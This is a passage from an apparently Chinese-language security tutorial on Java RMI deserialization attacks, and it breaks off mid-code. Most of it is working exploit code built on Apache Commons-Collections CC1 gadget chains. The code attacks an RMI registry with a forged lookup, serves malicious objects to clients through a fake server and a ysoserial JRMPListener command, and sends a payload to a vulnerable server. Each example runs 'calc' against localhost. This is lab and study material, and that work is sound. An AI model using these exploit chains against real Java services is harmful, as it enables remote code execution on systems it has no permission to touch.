class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.corba.se.spi.orb.Operation;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"><span class="keyword">import</span> sun.rmi.server.UnicastRef;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutput;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.RemoteCall;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.RemoteObject;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AttackRegistryEXP02</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.getRegistry(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">1099</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">invocationHandler</span> <span class="operator">=</span> (InvocationHandler) CC1_TransformedMap();</span><br><span class="line">        <span class="type">Remote</span> <span class="variable">remote</span> <span class="operator">=</span> Remote.class.cast(Proxy.newProxyInstance(</span><br><span class="line">                Remote.class.getClassLoader(),<span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; Remote.class &#125;, invocationHandler));</span><br><span class="line"></span><br><span class="line">        Field[] fields_0 = registry.getClass().getSuperclass().getSuperclass().getDeclaredFields();</span><br><span class="line">        fields_0[<span class="number">0</span>].setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">UnicastRef</span> <span class="variable">ref</span> <span class="operator">=</span> (UnicastRef) fields_0[<span class="number">0</span>].get(registry);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//获取operations</span></span><br><span class="line">        Field[] fields_1 = registry.getClass().getDeclaredFields();</span><br><span class="line">        fields_1[<span class="number">0</span>].setAccessible(<span class="literal">true</span>);</span><br><span class="line">        Operation[] operations = (Operation[]) fields_1[<span class="number">0</span>].get(registry);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 伪造lookup的代码，去伪造传输信息</span></span><br><span class="line">        <span class="type">RemoteCall</span> <span class="variable">var2</span> <span class="operator">=</span> ref.newCall((RemoteObject) registry, (java.rmi.server.Operation[]) operations, <span class="number">2</span>, <span class="number">4905912898345647071L</span>);</span><br><span class="line">        <span class="type">ObjectOutput</span> <span class="variable">var3</span> <span class="operator">=</span> var2.getOutputStream();</span><br><span class="line">        var3.writeObject(remote);</span><br><span class="line">        ref.invoke(var2);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">CC1_TransformedMap</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"><span class="comment">//        chainedTransformer.transform(Runtime.class);  // test</span></span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object,Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        map.put(<span class="string">&quot;value&quot;</span>,<span class="string">&quot;abc&quot;</span>);  <span class="comment">// 添加键值对</span></span><br><span class="line">        Map&lt;Object,Object&gt; transformedMap = TransformedMap.decorate(map,<span class="literal">null</span>,chainedTransformer);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// AnnotationInvocationHandler类是default，不能直接获取</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span>  <span class="variable">annotationInvocationHandlerConstructor</span> <span class="operator">=</span> c.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">        annotationInvocationHandlerConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> annotationInvocationHandlerConstructor.newInstance(Target.class,transformedMap);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> o;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="攻击客户端"><a href="#攻击客户端" class="headerlink" title="攻击客户端"></a>攻击客户端</h3><h4 id="注册中心攻击客户端"><a href="#注册中心攻击客户端" class="headerlink" title="注册中心攻击客户端"></a>注册中心攻击客户端</h4><p><code>unbind</code>和<code>rebind</code>返回数据给客户端的数据是序列化形式，那么到了客户端就会进行反序列化，如果我们能控制注册中心的返回数据，那么就能实现对客户端的攻击</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp .\ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections1 &#x27;calc&#x27;</span><br></pre></td></tr></table></figure><p>客户端</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Client</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.getRegistry(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">1099</span>);</span><br><span class="line">        registry.list();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="服务端攻击客户端"><a href="#服务端攻击客户端" class="headerlink" title="服务端攻击客户端"></a>服务端攻击客户端</h4><h5 id="服务端返回Object对象"><a href="#服务端返回Object对象" class="headerlink" title="服务端返回Object对象"></a>服务端返回Object对象</h5><p>在RMI中，远程调用方法传递回来的不一定是一个基础数据类型（String、int），也有可能是对象，当服务端返回给客户端一个对象时，客户端就要对应的进行反序列化。所以我们需要伪造一个服务端，当客户端调用某个远程方法时，返回的参数是我们构造好的恶意对象。这里以CC1为例：</p><p>User接口，返回的是Object对象</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">User</span> <span class="keyword">extends</span> <span class="title class_">java</span>.rmi.Remote &#123;</span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">getUser</span><span class="params">()</span> <span class="keyword">throws</span> Exception;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>服务端实现 User 接口，返回 CC1 的恶意 Object 对象</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.UnicastRemoteObject;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ServerReturnObject</span> <span class="keyword">extends</span> <span class="title class_">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title class_">User</span>  &#123;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">ServerReturnObject</span><span class="params">(String name, <span class="type">int</span> age)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        <span class="built_in">super</span>();</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">getUser</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object,Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate(map,chainedTransformer);</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">annotationInvocationHandlerConstructor</span> <span class="operator">=</span> c.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">        annotationInvocationHandlerConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">h</span> <span class="operator">=</span> (InvocationHandler) annotationInvocationHandlerConstructor.newInstance(Override.class,lazyMap);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">mapProxy</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(),<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;,h);</span><br><span class="line"></span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> annotationInvocationHandlerConstructor.newInstance(Override.class,mapProxy);</span><br><span class="line">        <span class="keyword">return</span> o;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>服务端将恶意对象绑定到注册中心</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.AlreadyBoundException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EvilClassServer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> RemoteException, AlreadyBoundException &#123;</span><br><span class="line">        <span class="type">User</span> <span class="variable">liming</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ServerReturnObject</span>(<span class="string">&quot;liming&quot;</span>,<span class="number">15</span>);</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        registry.bind(<span class="string">&quot;user&quot;</span>,liming);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>客户端获取对象并调用 <code>getUser()</code> 方法，将反序列化服务端传来的恶意远程对象</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EvilClient</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.getRegistry(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">1099</span>);</span><br><span class="line">        <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> (User) registry.lookup(<span class="string">&quot;user&quot;</span>);</span><br><span class="line">        user.getUser();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-20240319215932536.png" alt="image-20240319215932536"></p><h5 id="加载远程对象"><a href="#加载远程对象" class="headerlink" title="加载远程对象"></a>加载远程对象</h5><p>这个就是 P神 写的那个，codebase 这种。这个可用性还是不咋样，我个人觉得本身这个注册中心，或者是服务端打出来，就没啥意义；再加上利用条件苛刻，就更没劲了。</p><p>当服务端的某个方法返回的对象是客户端没有的时，客户端可以指定一个URL，此时会通过URL来实例化对象。</p><p><strong>java.rmi.server.codebase：</strong>codebase是一个地址，告诉Java虚拟机我们应该从哪个地方去搜索类，有点像我们日常用的 CLASSPATH，但CLASSPATH是本地路径，而codebase通常是远程URL，比如http、ftp等。</p><p>RMI核心特点之一就是动态类加载，如果当前JVM中没有某个类的定义，它可以从远程URL去下载这个类的class，动态加载的class文件可以使用<code>http://</code>、<code>ftp://</code>、file:&#x2F;&#x2F;进行托管。这可以动态的扩展远程应用的功能，RMI注册表上可以动态的加载绑定多个RMI应用。对于客户端而言，如果服务端方法的返回值可能是一些子类的对象实例，而客户端并没有这些子类的class文件，如果需要客户端正确调用这些<strong>子类</strong>中被重写的方法，客户端就需要从服务端提供的<code>java.rmi.server.codebase</code>URL去加载类；对于服务端而言，如果客户端传递的方法参数是远程对象接口方法参数类型的子类，那么服务端需要从客户端提供的<code>java.rmi.server.codebase</code>URL去加载对应的类。客户端与服务端两边的<code>java.rmi.server.codebase</code>URL都是互相传递的。无论是客户端还是服务端要远程加载类，都需要满足以下条件：</p><ol><li>由于Java SecurityManager的限制，默认是不允许远程加载的，如果需要进行远程加载类，需要安装RMISecurityManager并且配置<code>java.security.policy</code>，这在后面的利用中可以看到。</li><li>属性 <code>java.rmi.server.useCodebaseOnly</code> 的值必需为false。但是从JDK 6u45、7u21开始，<code>java.rmi.server.useCodebaseOnly</code> 的默认值就是true。当该值为true时，将禁用自动加载远程类文件，仅从CLASSPATH和当前虚拟机的<code>java.rmi.server.codebase</code> 指定路径加载类文件。使用这个属性来防止虚拟机从其他Codebase地址上动态加载类，增加了RMI ClassLoader的安全性。</li></ol><p>总的来说利用条件十分苛刻，可用性不强。</p><h3 id="攻击服务端"><a href="#攻击服务端" class="headerlink" title="攻击服务端"></a>攻击服务端</h3><h4 id="客户端打服务端"><a href="#客户端打服务端" class="headerlink" title="客户端打服务端"></a>客户端打服务端</h4><ul><li>jdk版本1.7</li><li>使用具有漏洞的Commons-Collections3.1组件</li><li>RMI提供的数据有Object类型（攻击payload就是Object类型）</li></ul><p>服务端</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.UnicastRemoteObject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">VictimServer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">RemoteObj</span> <span class="keyword">extends</span> <span class="title class_">Remote</span> &#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">evil</span><span class="params">(Object obj)</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RemoteHelloWorld</span> <span class="keyword">extends</span> <span class="title class_">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title class_">RemoteObj</span> &#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="title function_">RemoteHelloWorld</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">            <span class="built_in">super</span>();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">evil</span><span class="params">(Object obj)</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;调用了evil方法，传递对象为：&quot;</span> + obj);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">start</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">RemoteHelloWorld</span> <span class="variable">h</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RemoteHelloWorld</span>();</span><br><span class="line">        LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        Naming.rebind(<span class="string">&quot;rmi://127.0.0.1:1099/Hello&quot;</span>, h);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">VictimServer</span>().start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>客户端</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIClient</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        VictimServer.<span class="type">RemoteObj</span> <span class="variable">r</span> <span class="operator">=</span> (VictimServer.RemoteObj) Naming.lookup(<span class="string">&quot;rmi://127.0.0.1:1099/Hello&quot;</span>);</span><br><span class="line">        r.evil(getpayload());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getpayload</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        map.put(<span class="string">&quot;value&quot;</span>, <span class="string">&quot;lala&quot;</span>);</span><br><span class="line">     